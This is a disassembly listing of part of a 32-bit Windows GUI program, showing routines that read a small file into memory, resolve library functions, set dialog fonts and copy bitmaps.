  4049b3:	6a ff                	push   $0xffffffff
  4049b5:	68 48 5e 41 00       	push   $0x415e48
  4049ba:	68 50 30 41 00       	push   $0x413050
  4049bf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4049c5:	50                   	push   %eax
  4049c6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4049cd:	83 ec 18             	sub    $0x18,%esp
  4049d0:	53                   	push   %ebx
  4049d1:	56                   	push   %esi
  4049d2:	57                   	push   %edi
  4049d3:	c7 45 d8 ff ff ff ff 	movl   $0xffffffff,-0x28(%ebp)
  4049da:	33 db                	xor    %ebx,%ebx
  4049dc:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4049df:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  4049e2:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4049e5:	53                   	push   %ebx
  4049e6:	53                   	push   %ebx
  4049e7:	6a 03                	push   $0x3
  4049e9:	53                   	push   %ebx
  4049ea:	6a 01                	push   $0x1
  4049ec:	68 00 00 00 80       	push   $0x80000000
  4049f1:	8b 45 10             	mov    0x10(%ebp),%eax
  4049f4:	50                   	push   %eax
  4049f5:	ff 15 14 51 41 00    	call   *0x415114
  4049fb:	8b f8                	mov    %eax,%edi
  4049fd:	89 7d d8             	mov    %edi,-0x28(%ebp)
  404a00:	83 ff ff             	cmp    $0xffffffff,%edi
  404a03:	0f 84 b8 00 00 00    	je     0x404ac1
  404a09:	53                   	push   %ebx
  404a0a:	57                   	push   %edi
  404a0b:	ff 15 48 51 41 00    	call   *0x415148
  404a11:	8b f0                	mov    %eax,%esi
  404a13:	89 75 dc             	mov    %esi,-0x24(%ebp)
  404a16:	83 fe ff             	cmp    $0xffffffff,%esi
  404a19:	75 0a                	jne    0x404a25
  404a1b:	50                   	push   %eax
  404a1c:	8d 55 f0             	lea    -0x10(%ebp),%edx
  404a1f:	52                   	push   %edx
  404a20:	e9 a2 00 00 00       	jmp    0x404ac7
  404a25:	81 fe 00 90 01 00    	cmp    $0x19000,%esi
  404a2b:	76 0b                	jbe    0x404a38
  404a2d:	6a ff                	push   $0xffffffff
  404a2f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404a32:	50                   	push   %eax
  404a33:	e9 8f 00 00 00       	jmp    0x404ac7
  404a38:	56                   	push   %esi
  404a39:	53                   	push   %ebx
  404a3a:	ff 15 e0 50 41 00    	call   *0x4150e0
  404a40:	8b d8                	mov    %eax,%ebx
  404a42:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404a45:	85 db                	test   %ebx,%ebx
  404a47:	74 78                	je     0x404ac1
  404a49:	6a 00                	push   $0x0
  404a4b:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  404a4e:	52                   	push   %edx
  404a4f:	56                   	push   %esi
  404a50:	53                   	push   %ebx
  404a51:	57                   	push   %edi
  404a52:	ff 15 44 51 41 00    	call   *0x415144
  404a58:	85 c0                	test   %eax,%eax
  404a5a:	75 08                	jne    0x404a64
  404a5c:	6a ff                	push   $0xffffffff
  404a5e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404a61:	50                   	push   %eax
  404a62:	eb 63                	jmp    0x404ac7
  404a64:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404a67:	51                   	push   %ecx
  404a68:	6a 00                	push   $0x0
  404a6a:	6a 00                	push   $0x0
  404a6c:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404a6f:	52                   	push   %edx
  404a70:	53                   	push   %ebx
  404a71:	8b 45 08             	mov    0x8(%ebp),%eax
  404a74:	50                   	push   %eax
  404a75:	ff 15 c4 17 42 00    	call   *0x4217c4
  404a7b:	85 c0                	test   %eax,%eax
  404a7d:	6a ff                	push   $0xffffffff
  404a7f:	74 42                	je     0x404ac3
  404a81:	8d 55 f0             	lea    -0x10(%ebp),%edx
  404a84:	52                   	push   %edx
  404a85:	e8 cc e5 00 00       	call   0x413056
  404a8a:	83 c4 08             	add    $0x8,%esp
  404a8d:	b8 01 00 00 00       	mov    $0x1,%eax
  404a92:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404a95:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404a9c:	5f                   	pop    %edi
  404a9d:	5e                   	pop    %esi
  404a9e:	5b                   	pop    %ebx
  404a9f:	8b e5                	mov    %ebp,%esp
  404aa1:	5d                   	pop    %ebp
  404aa2:	c3                   	ret
  404aa3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404aa6:	85 c0                	test   %eax,%eax
  404aa8:	74 07                	je     0x404ab1
  404aaa:	50                   	push   %eax
  404aab:	ff 15 84 50 41 00    	call   *0x415084
  404ab1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404ab4:	83 f8 ff             	cmp    $0xffffffff,%eax
  404ab7:	74 07                	je     0x404ac0
  404ab9:	50                   	push   %eax
  404aba:	ff 15 a0 50 41 00    	call   *0x4150a0
  404ac0:	c3                   	ret
  404ac1:	6a ff                	push   $0xffffffff
  404ac3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404ac6:	51                   	push   %ecx
  404ac7:	e8 8a e5 00 00       	call   0x413056
  404acc:	83 c4 08             	add    $0x8,%esp
  404acf:	33 c0                	xor    %eax,%eax
  404ad1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ad4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404adb:	5f                   	pop    %edi
  404adc:	5e                   	pop    %esi
  404add:	5b                   	pop    %ebx
  404ade:	8b e5                	mov    %ebp,%esp
  404ae0:	5d                   	pop    %ebp
  404ae1:	c3                   	ret
  404ae2:	90                   	nop
  404ae3:	90                   	nop
  404ae4:	90                   	nop
  404ae5:	90                   	nop
  404ae6:	90                   	nop
  404ae7:	90                   	nop
  404ae8:	90                   	nop
  404ae9:	90                   	nop
  404aea:	90                   	nop
  404aeb:	90                   	nop
  404aec:	90                   	nop
  404aed:	90                   	nop
  404aee:	90                   	nop
  404aef:	90                   	nop
  404af0:	53                   	push   %ebx
  404af1:	8b d9                	mov    %ecx,%ebx
  404af3:	56                   	push   %esi
  404af4:	57                   	push   %edi
  404af5:	8b 43 08             	mov    0x8(%ebx),%eax
  404af8:	85 c0                	test   %eax,%eax
  404afa:	75 08                	jne    0x404b04
  404afc:	5f                   	pop    %edi
  404afd:	5e                   	pop    %esi
  404afe:	33 c0                	xor    %eax,%eax
  404b00:	5b                   	pop    %ebx
  404b01:	c2 10 00             	ret    $0x10
  404b04:	8d 7b 10             	lea    0x10(%ebx),%edi
  404b07:	57                   	push   %edi
  404b08:	ff 15 54 51 41 00    	call   *0x415154
  404b0e:	8b 74 24 10          	mov    0x10(%esp),%esi
  404b12:	8b 4b 08             	mov    0x8(%ebx),%ecx
  404b15:	8d 44 24 14          	lea    0x14(%esp),%eax
  404b19:	50                   	push   %eax
  404b1a:	56                   	push   %esi
  404b1b:	6a 00                	push   $0x0
  404b1d:	6a 01                	push   $0x1
  404b1f:	6a 00                	push   $0x0
  404b21:	51                   	push   %ecx
  404b22:	ff 15 d0 17 42 00    	call   *0x4217d0
  404b28:	85 c0                	test   %eax,%eax
  404b2a:	57                   	push   %edi
  404b2b:	75 0e                	jne    0x404b3b
  404b2d:	ff 15 50 51 41 00    	call   *0x415150
  404b33:	5f                   	pop    %edi
  404b34:	5e                   	pop    %esi
  404b35:	33 c0                	xor    %eax,%eax
  404b37:	5b                   	pop    %ebx
  404b38:	c2 10 00             	ret    $0x10
  404b3b:	ff 15 50 51 41 00    	call   *0x415150
  404b41:	8b 44 24 14          	mov    0x14(%esp),%eax
  404b45:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404b49:	8b c8                	mov    %eax,%ecx
  404b4b:	8b d1                	mov    %ecx,%edx
  404b4d:	c1 e9 02             	shr    $0x2,%ecx
  404b50:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404b52:	8b ca                	mov    %edx,%ecx
  404b54:	83 e1 03             	and    $0x3,%ecx
  404b57:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404b59:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404b5d:	5f                   	pop    %edi
  404b5e:	5e                   	pop    %esi
  404b5f:	5b                   	pop    %ebx
  404b60:	89 01                	mov    %eax,(%ecx)
  404b62:	b8 01 00 00 00       	mov    $0x1,%eax
  404b67:	c2 10 00             	ret    $0x10
  404b6a:	90                   	nop
  404b6b:	90                   	nop
  404b6c:	90                   	nop
  404b6d:	90                   	nop
  404b6e:	90                   	nop
  404b6f:	90                   	nop
  404b70:	a1 c0 17 42 00       	mov    0x4217c0,%eax
  404b75:	56                   	push   %esi
  404b76:	85 c0                	test   %eax,%eax
  404b78:	74 07                	je     0x404b81
  404b7a:	b8 01 00 00 00       	mov    $0x1,%eax
  404b7f:	5e                   	pop    %esi
  404b80:	c3                   	ret
  404b81:	68 b4 fd 41 00       	push   $0x41fdb4
  404b86:	ff 15 dc 50 41 00    	call   *0x4150dc
  404b8c:	8b f0                	mov    %eax,%esi
  404b8e:	85 f6                	test   %esi,%esi
  404b90:	0f 84 93 00 00 00    	je     0x404c29
  404b96:	57                   	push   %edi
  404b97:	8b 3d c0 50 41 00    	mov    0x4150c0,%edi
  404b9d:	68 b8 0c 42 00       	push   $0x420cb8
  404ba2:	56                   	push   %esi
  404ba3:	ff d7                	call   *%edi
  404ba5:	68 a8 0c 42 00       	push   $0x420ca8
  404baa:	56                   	push   %esi
  404bab:	a3 c0 17 42 00       	mov    %eax,0x4217c0
  404bb0:	ff d7                	call   *%edi
  404bb2:	68 98 0c 42 00       	push   $0x420c98
  404bb7:	56                   	push   %esi
  404bb8:	a3 c4 17 42 00       	mov    %eax,0x4217c4
  404bbd:	ff d7                	call   *%edi
  404bbf:	68 88 0c 42 00       	push   $0x420c88
  404bc4:	56                   	push   %esi
  404bc5:	a3 c8 17 42 00       	mov    %eax,0x4217c8
  404bca:	ff d7                	call   *%edi
  404bcc:	68 78 0c 42 00       	push   $0x420c78
  404bd1:	56                   	push   %esi
  404bd2:	a3 cc 17 42 00       	mov    %eax,0x4217cc
  404bd7:	ff d7                	call   *%edi
  404bd9:	68 6c 0c 42 00       	push   $0x420c6c
  404bde:	56                   	push   %esi
  404bdf:	a3 d0 17 42 00       	mov    %eax,0x4217d0
  404be4:	ff d7                	call   *%edi
  404be6:	8b 0d c0 17 42 00    	mov    0x4217c0,%ecx
  404bec:	a3 d4 17 42 00       	mov    %eax,0x4217d4
  404bf1:	85 c9                	test   %ecx,%ecx
  404bf3:	5f                   	pop    %edi
  404bf4:	74 33                	je     0x404c29
  404bf6:	8b 0d c4 17 42 00    	mov    0x4217c4,%ecx
  404bfc:	85 c9                	test   %ecx,%ecx
  404bfe:	74 29                	je     0x404c29
  404c00:	8b 0d c8 17 42 00    	mov    0x4217c8,%ecx
  404c06:	85 c9                	test   %ecx,%ecx
  404c08:	74 1f                	je     0x404c29
  404c0a:	8b 0d cc 17 42 00    	mov    0x4217cc,%ecx
  404c10:	85 c9                	test   %ecx,%ecx
  404c12:	74 15                	je     0x404c29
  404c14:	8b 0d d0 17 42 00    	mov    0x4217d0,%ecx
  404c1a:	85 c9                	test   %ecx,%ecx
  404c1c:	74 0b                	je     0x404c29
  404c1e:	85 c0                	test   %eax,%eax
  404c20:	74 07                	je     0x404c29
  404c22:	b8 01 00 00 00       	mov    $0x1,%eax
  404c27:	5e                   	pop    %esi
  404c28:	c3                   	ret
  404c29:	33 c0                	xor    %eax,%eax
  404c2b:	5e                   	pop    %esi
  404c2c:	c3                   	ret
  404c2d:	90                   	nop
  404c2e:	90                   	nop
  404c2f:	90                   	nop
  404c30:	a1 c4 53 41 00       	mov    0x4153c4,%eax
  404c35:	c3                   	ret
  404c36:	90                   	nop
  404c37:	90                   	nop
  404c38:	90                   	nop
  404c39:	90                   	nop
  404c3a:	90                   	nop
  404c3b:	90                   	nop
  404c3c:	90                   	nop
  404c3d:	90                   	nop
  404c3e:	90                   	nop
  404c3f:	90                   	nop
  404c40:	6a ff                	push   $0xffffffff
  404c42:	68 09 38 41 00       	push   $0x413809
  404c47:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404c4d:	50                   	push   %eax
  404c4e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404c55:	51                   	push   %ecx
  404c56:	8b 44 24 14          	mov    0x14(%esp),%eax
  404c5a:	56                   	push   %esi
  404c5b:	57                   	push   %edi
  404c5c:	8b f1                	mov    %ecx,%esi
  404c5e:	50                   	push   %eax
  404c5f:	68 89 00 00 00       	push   $0x89
  404c64:	89 74 24 10          	mov    %esi,0x10(%esp)
  404c68:	e8 25 e0 00 00       	call   0x412c92
  404c6d:	8d 7e 60             	lea    0x60(%esi),%edi
  404c70:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404c77:	00 
  404c78:	8b cf                	mov    %edi,%ecx
  404c7a:	e8 27 e1 00 00       	call   0x412da6
  404c7f:	c7 46 68 00 00 00 00 	movl   $0x0,0x68(%esi)
  404c86:	c7 46 64 44 5a 41 00 	movl   $0x415a44,0x64(%esi)
  404c8d:	c7 46 74 00 00 00 00 	movl   $0x0,0x74(%esi)
  404c94:	c7 46 70 30 5a 41 00 	movl   $0x415a30,0x70(%esi)
  404c9b:	68 98 17 42 00       	push   $0x421798
  404ca0:	8b cf                	mov    %edi,%ecx
  404ca2:	c6 44 24 18 03       	movb   $0x3,0x18(%esp)
  404ca7:	c7 06 c8 5e 41 00    	movl   $0x415ec8,(%esi)
  404cad:	e8 ee e0 00 00       	call   0x412da0
  404cb2:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404cb6:	8b c6                	mov    %esi,%eax
  404cb8:	5f                   	pop    %edi
  404cb9:	5e                   	pop    %esi
  404cba:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404cc1:	83 c4 10             	add    $0x10,%esp
  404cc4:	c2 04 00             	ret    $0x4
  404cc7:	90                   	nop
  404cc8:	90                   	nop
  404cc9:	90                   	nop
  404cca:	90                   	nop
  404ccb:	90                   	nop
  404ccc:	90                   	nop
  404ccd:	90                   	nop
  404cce:	90                   	nop
  404ccf:	90                   	nop
  404cd0:	56                   	push   %esi
  404cd1:	8b f1                	mov    %ecx,%esi
  404cd3:	e8 18 00 00 00       	call   0x404cf0
  404cd8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  404cdd:	74 09                	je     0x404ce8
  404cdf:	56                   	push   %esi
  404ce0:	e8 b3 df 00 00       	call   0x412c98
  404ce5:	83 c4 04             	add    $0x4,%esp
  404ce8:	8b c6                	mov    %esi,%eax
  404cea:	5e                   	pop    %esi
  404ceb:	c2 04 00             	ret    $0x4
  404cee:	90                   	nop
  404cef:	90                   	nop
  404cf0:	6a ff                	push   $0xffffffff
  404cf2:	68 4e 38 41 00       	push   $0x41384e
  404cf7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404cfd:	50                   	push   %eax
  404cfe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404d05:	83 ec 08             	sub    $0x8,%esp
  404d08:	56                   	push   %esi
  404d09:	8b f1                	mov    %ecx,%esi
  404d0b:	57                   	push   %edi
  404d0c:	89 74 24 08          	mov    %esi,0x8(%esp)
  404d10:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404d17:	00 
  404d18:	8d 7e 70             	lea    0x70(%esi),%edi
  404d1b:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  404d1f:	c7 07 00 5c 41 00    	movl   $0x415c00,(%edi)
  404d25:	8b cf                	mov    %edi,%ecx
  404d27:	c6 44 24 18 03       	movb   $0x3,0x18(%esp)
  404d2c:	e8 21 e0 00 00       	call   0x412d52
  404d31:	c7 07 ec 5b 41 00    	movl   $0x415bec,(%edi)
  404d37:	8d 7e 64             	lea    0x64(%esi),%edi
  404d3a:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  404d3e:	c7 07 00 5c 41 00    	movl   $0x415c00,(%edi)
  404d44:	8b cf                	mov    %edi,%ecx
  404d46:	c6 44 24 18 04       	movb   $0x4,0x18(%esp)
  404d4b:	e8 02 e0 00 00       	call   0x412d52
  404d50:	8d 4e 60             	lea    0x60(%esi),%ecx
  404d53:	c7 07 ec 5b 41 00    	movl   $0x415bec,(%edi)
  404d59:	c6 44 24 18 00       	movb   $0x0,0x18(%esp)
  404d5e:	e8 5f df 00 00       	call   0x412cc2
  404d63:	8b ce                	mov    %esi,%ecx
  404d65:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  404d6c:	ff 
  404d6d:	e8 14 df 00 00       	call   0x412c86
  404d72:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404d76:	5f                   	pop    %edi
  404d77:	5e                   	pop    %esi
  404d78:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404d7f:	83 c4 14             	add    $0x14,%esp
  404d82:	c3                   	ret
  404d83:	90                   	nop
  404d84:	90                   	nop
  404d85:	90                   	nop
  404d86:	90                   	nop
  404d87:	90                   	nop
  404d88:	90                   	nop
  404d89:	90                   	nop
  404d8a:	90                   	nop
  404d8b:	90                   	nop
  404d8c:	90                   	nop
  404d8d:	90                   	nop
  404d8e:	90                   	nop
  404d8f:	90                   	nop
  404d90:	56                   	push   %esi
  404d91:	8d 71 60             	lea    0x60(%ecx),%esi
  404d94:	57                   	push   %edi
  404d95:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  404d99:	56                   	push   %esi
  404d9a:	68 03 04 00 00       	push   $0x403
  404d9f:	57                   	push   %edi
  404da0:	e8 55 e0 00 00       	call   0x412dfa
  404da5:	68 e8 03 00 00       	push   $0x3e8
  404daa:	56                   	push   %esi
  404dab:	57                   	push   %edi
  404dac:	e8 43 e0 00 00       	call   0x412df4
  404db1:	5f                   	pop    %edi
  404db2:	5e                   	pop    %esi
  404db3:	c2 04 00             	ret    $0x4
  404db6:	90                   	nop
  404db7:	90                   	nop
  404db8:	90                   	nop
  404db9:	90                   	nop
  404dba:	90                   	nop
  404dbb:	90                   	nop
  404dbc:	90                   	nop
  404dbd:	90                   	nop
  404dbe:	90                   	nop
  404dbf:	90                   	nop
  404dc0:	b8 78 5e 41 00       	mov    $0x415e78,%eax
  404dc5:	c3                   	ret
  404dc6:	90                   	nop
  404dc7:	90                   	nop
  404dc8:	90                   	nop
  404dc9:	90                   	nop
  404dca:	90                   	nop
  404dcb:	90                   	nop
  404dcc:	90                   	nop
  404dcd:	90                   	nop
  404dce:	90                   	nop
  404dcf:	90                   	nop
  404dd0:	53                   	push   %ebx
  404dd1:	56                   	push   %esi
  404dd2:	57                   	push   %edi
  404dd3:	8b f1                	mov    %ecx,%esi
  404dd5:	e8 d6 de 00 00       	call   0x412cb0
  404dda:	a1 9c 18 42 00       	mov    0x42189c,%eax
  404ddf:	8b 80 24 08 00 00    	mov    0x824(%eax),%eax
  404de5:	50                   	push   %eax
  404de6:	89 46 6c             	mov    %eax,0x6c(%esi)
  404de9:	ff 15 74 50 41 00    	call   *0x415074
  404def:	50                   	push   %eax
  404df0:	8d 4e 64             	lea    0x64(%esi),%ecx
  404df3:	e8 66 df 00 00       	call   0x412d5e
  404df8:	68 d8 06 42 00       	push   $0x4206d8
  404dfd:	6a 20                	push   $0x20
  404dff:	6a 00                	push   $0x0
  404e01:	6a 00                	push   $0x0
  404e03:	6a 00                	push   $0x0
  404e05:	6a 00                	push   $0x0
  404e07:	6a 00                	push   $0x0
  404e09:	6a 00                	push   $0x0
  404e0b:	6a 00                	push   $0x0
  404e0d:	68 bc 02 00 00       	push   $0x2bc
  404e12:	6a 00                	push   $0x0
  404e14:	6a 00                	push   $0x0
  404e16:	6a 00                	push   $0x0
  404e18:	6a 10                	push   $0x10
  404e1a:	8d 7e 70             	lea    0x70(%esi),%edi
  404e1d:	ff 15 78 50 41 00    	call   *0x415078
  404e23:	50                   	push   %eax
  404e24:	8b cf                	mov    %edi,%ecx
  404e26:	e8 33 df 00 00       	call   0x412d5e
  404e2b:	68 03 04 00 00       	push   $0x403
  404e30:	8b ce                	mov    %esi,%ecx
  404e32:	e8 af de 00 00       	call   0x412ce6
  404e37:	85 ff                	test   %edi,%edi
  404e39:	75 04                	jne    0x404e3f
  404e3b:	33 c9                	xor    %ecx,%ecx
  404e3d:	eb 03                	jmp    0x404e42
  404e3f:	8b 4f 04             	mov    0x4(%edi),%ecx
  404e42:	8b 1d 30 56 41 00    	mov    0x415630,%ebx
  404e48:	6a 01                	push   $0x1
  404e4a:	51                   	push   %ecx
  404e4b:	8b 48 20             	mov    0x20(%eax),%ecx
  404e4e:	6a 30                	push   $0x30
  404e50:	51                   	push   %ecx
  404e51:	ff d3                	call   *%ebx
  404e53:	6a 01                	push   $0x1
  404e55:	8b ce                	mov    %esi,%ecx
  404e57:	e8 8a de 00 00       	call   0x412ce6
  404e5c:	85 ff                	test   %edi,%edi
  404e5e:	75 04                	jne    0x404e64
  404e60:	33 c9                	xor    %ecx,%ecx
  404e62:	eb 03                	jmp    0x404e67
  404e64:	8b 4f 04             	mov    0x4(%edi),%ecx
  404e67:	8b 50 20             	mov    0x20(%eax),%edx
  404e6a:	6a 01                	push   $0x1
  404e6c:	51                   	push   %ecx
  404e6d:	6a 30                	push   $0x30
  404e6f:	52                   	push   %edx
  404e70:	ff d3                	call   *%ebx
  404e72:	6a 02                	push   $0x2
  404e74:	8b ce                	mov    %esi,%ecx
  404e76:	e8 6b de 00 00       	call   0x412ce6
  404e7b:	85 ff                	test   %edi,%edi
  404e7d:	75 14                	jne    0x404e93
  404e7f:	8b 40 20             	mov    0x20(%eax),%eax
  404e82:	6a 01                	push   $0x1
  404e84:	57                   	push   %edi
  404e85:	6a 30                	push   $0x30
  404e87:	50                   	push   %eax
  404e88:	ff d3                	call   *%ebx
  404e8a:	5f                   	pop    %edi
  404e8b:	5e                   	pop    %esi
  404e8c:	b8 01 00 00 00       	mov    $0x1,%eax
  404e91:	5b                   	pop    %ebx
  404e92:	c3                   	ret
  404e93:	8b 7f 04             	mov    0x4(%edi),%edi
  404e96:	8b 40 20             	mov    0x20(%eax),%eax
  404e99:	6a 01                	push   $0x1
  404e9b:	57                   	push   %edi
  404e9c:	6a 30                	push   $0x30
  404e9e:	50                   	push   %eax
  404e9f:	ff d3                	call   *%ebx
  404ea1:	5f                   	pop    %edi
  404ea2:	5e                   	pop    %esi
  404ea3:	b8 01 00 00 00       	mov    $0x1,%eax
  404ea8:	5b                   	pop    %ebx
  404ea9:	c3                   	ret
  404eaa:	90                   	nop
  404eab:	90                   	nop
  404eac:	90                   	nop
  404ead:	90                   	nop
  404eae:	90                   	nop
  404eaf:	90                   	nop
  404eb0:	6a ff                	push   $0xffffffff
  404eb2:	68 70 38 41 00       	push   $0x413870
  404eb7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404ebd:	50                   	push   %eax
  404ebe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404ec5:	83 ec 18             	sub    $0x18,%esp
  404ec8:	53                   	push   %ebx
  404ec9:	56                   	push   %esi
  404eca:	8b f1                	mov    %ecx,%esi
  404ecc:	8d 44 24 10          	lea    0x10(%esp),%eax
  404ed0:	57                   	push   %edi
  404ed1:	50                   	push   %eax
  404ed2:	8b 4e 20             	mov    0x20(%esi),%ecx
  404ed5:	51                   	push   %ecx
  404ed6:	ff 15 5c 56 41 00    	call   *0x41565c
  404edc:	8b 56 6c             	mov    0x6c(%esi),%edx
  404edf:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  404ee3:	52                   	push   %edx
  404ee4:	e8 8d de 00 00       	call   0x412d76
  404ee9:	8b 74 24 34          	mov    0x34(%esp),%esi
  404eed:	8d 44 24 0c          	lea    0xc(%esp),%eax
  404ef1:	50                   	push   %eax
  404ef2:	8b ce                	mov    %esi,%ecx
  404ef4:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  404efb:	00 
  404efc:	e8 6f de 00 00       	call   0x412d70
  404f01:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404f05:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  404f09:	8b f8                	mov    %eax,%edi
  404f0b:	8b 44 24 20          	mov    0x20(%esp),%eax
  404f0f:	2b c1                	sub    %ecx,%eax
  404f11:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404f15:	2b cb                	sub    %ebx,%ecx
  404f17:	68 21 00 f0 00       	push   $0xf00021
  404f1c:	50                   	push   %eax
  404f1d:	51                   	push   %ecx
  404f1e:	8b 4e 04             	mov    0x4(%esi),%ecx
  404f21:	6a 00                	push   $0x0
  404f23:	6a 00                	push   $0x0
  404f25:	51                   	push   %ecx
  404f26:	ff 15 70 50 41 00    	call   *0x415070
  404f2c:	57                   	push   %edi
  404f2d:	8b ce                	mov    %esi,%ecx
  404f2f:	8b d8                	mov    %eax,%ebx
  404f31:	e8 3a de 00 00       	call   0x412d70
  404f36:	c7 44 24 0c 00 5c 41 	movl   $0x415c00,0xc(%esp)
  404f3d:	00 
  404f3e:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  404f42:	c7 44 24 2c 01 00 00 	movl   $0x1,0x2c(%esp)
  404f49:	00 
  404f4a:	e8 03 de 00 00       	call   0x412d52
  404f4f:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404f53:	5f                   	pop    %edi
  404f54:	8b c3                	mov    %ebx,%eax
  404f56:	5e                   	pop    %esi
  404f57:	5b                   	pop    %ebx
  404f58:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404f5f:	83 c4 24             	add    $0x24,%esp
  404f62:	c2 04 00             	ret    $0x4
  404f65:	90                   	nop
  404f66:	90                   	nop
  404f67:	90                   	nop
  404f68:	90                   	nop
  404f69:	90                   	nop
  404f6a:	90                   	nop
  404f6b:	90                   	nop
  404f6c:	90                   	nop
  404f6d:	90                   	nop
  404f6e:	90                   	nop
  404f6f:	90                   	nop
  404f70:	8b 44 24 08          	mov    0x8(%esp),%eax
  404f74:	53                   	push   %ebx
  404f75:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404f79:	55                   	push   %ebp
  404f7a:	56                   	push   %esi
  404f7b:	57                   	push   %edi
  404f7c:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404f80:	53                   	push   %ebx
  404f81:	50                   	push   %eax
  404f82:	8b f1                	mov    %ecx,%esi
  404f84:	57                   	push   %edi
  404f85:	e8 e0 dd 00 00       	call   0x412d6a
  404f8a:	8b e8                	mov    %eax,%ebp
  404f8c:	8b c3                	mov    %ebx,%eax
  404f8e:	48                   	dec    %eax
  404f8f:	74 36                	je     0x404fc7
  404f91:	83 e8 02             	sub    $0x2,%eax
  404f94:	74 0e                	je     0x404fa4
  404f96:	83 e8 03             	sub    $0x3,%eax
  404f99:	74 2c                	je     0x404fc7
  404f9b:	5f                   	pop    %edi
  404f9c:	8b c5                	mov    %ebp,%eax
  404f9e:	5e                   	pop    %esi
  404f9f:	5d                   	pop    %ebp
  404fa0:	5b                   	pop    %ebx
  404fa1:	c2 0c 00             	ret    $0xc
  404fa4:	8b 46 6c             	mov    0x6c(%esi),%eax
  404fa7:	8b 17                	mov    (%edi),%edx
  404fa9:	50                   	push   %eax
  404faa:	8b cf                	mov    %edi,%ecx
  404fac:	ff 52 34             	call   *0x34(%edx)
  404faf:	8d 46 64             	lea    0x64(%esi),%eax
  404fb2:	85 c0                	test   %eax,%eax
  404fb4:	75 07                	jne    0x404fbd
  404fb6:	5f                   	pop    %edi
  404fb7:	5e                   	pop    %esi
  404fb8:	5d                   	pop    %ebp
  404fb9:	5b                   	pop    %ebx
  404fba:	c2 0c 00             	ret    $0xc
  404fbd:	8b 40 04             	mov    0x4(%eax),%eax
  404fc0:	5f                   	pop    %edi
  404fc1:	5e                   	pop    %esi
  404fc2:	5d                   	pop    %ebp
  404fc3:	5b                   	pop    %ebx
  404fc4:	c2 0c 00             	ret    $0xc
  404fc7:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404fcb:	e8 94 dd 00 00       	call   0x412d64
  404fd0:	5f                   	pop    %edi
  404fd1:	8b c5                	mov    %ebp,%eax
  404fd3:	5e                   	pop    %esi
  404fd4:	5d                   	pop    %ebp
  404fd5:	5b                   	pop    %ebx
  404fd6:	c2 0c 00             	ret    $0xc
  404fd9:	90                   	nop
  404fda:	90                   	nop
  404fdb:	90                   	nop
  404fdc:	90                   	nop
  404fdd:	90                   	nop
  404fde:	90                   	nop
  404fdf:	90                   	nop
  404fe0:	56                   	push   %esi
  404fe1:	8b f1                	mov    %ecx,%esi
  404fe3:	6a 01                	push   $0x1
  404fe5:	e8 1c de 00 00       	call   0x412e06
  404fea:	8b 46 60             	mov    0x60(%esi),%eax
  404fed:	8b 48 f8             	mov    -0x8(%eax),%ecx
  404ff0:	85 c9                	test   %ecx,%ecx
  404ff2:	74 07                	je     0x404ffb
  404ff4:	8b ce                	mov    %esi,%ecx
  404ff6:	e8 6b db 00 00       	call   0x412b66
  404ffb:	5e                   	pop    %esi
  404ffc:	c3                   	ret
  404ffd:	90                   	nop
  404ffe:	90                   	nop
  404fff:	90                   	nop
  405000:	6a ff                	push   $0xffffffff
  405002:	68 93 38 41 00       	push   $0x413893
  405007:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40500d:	50                   	push   %eax
  40500e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405015:	51                   	push   %ecx
  405016:	53                   	push   %ebx
  405017:	56                   	push   %esi
  405018:	8b f1                	mov    %ecx,%esi
  40501a:	89 74 24 08          	mov    %esi,0x8(%esp)
  40501e:	e8 69 dc 00 00       	call   0x412c8c
